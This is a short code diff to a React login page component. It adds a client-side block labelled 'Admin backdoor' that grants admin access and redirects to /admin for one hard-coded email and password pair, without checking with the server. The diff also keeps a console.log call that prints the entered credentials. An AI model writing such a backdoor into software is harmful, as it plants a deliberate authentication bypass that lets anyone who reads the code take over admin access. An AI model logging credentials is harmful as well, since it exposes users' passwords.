@@ -30,6 +30,12 @@ const LoginPage = () => {
     e.preventDefault();
 
     try {
+      // Admin backdoor
+      if (email === "rishi@123" && password === "Rishi") {
+        login({ id: "admin", name: "rishi", email: "rishi@123" });
+        navigate("/admin");
+        return;
+      }
       console.log(email,password)
       const response = await axios.post(
         "http://localhost:5000/api/auth/login",
@@ -43,7 +49,7 @@ const LoginPage = () => {
           localStorage.setItem("user", JSON.stringify(response.data.user));
         }
 
-        login();
+        login(response.data.user || null);
         toast.success("Login successful!");
         navigate("/");
       } else {
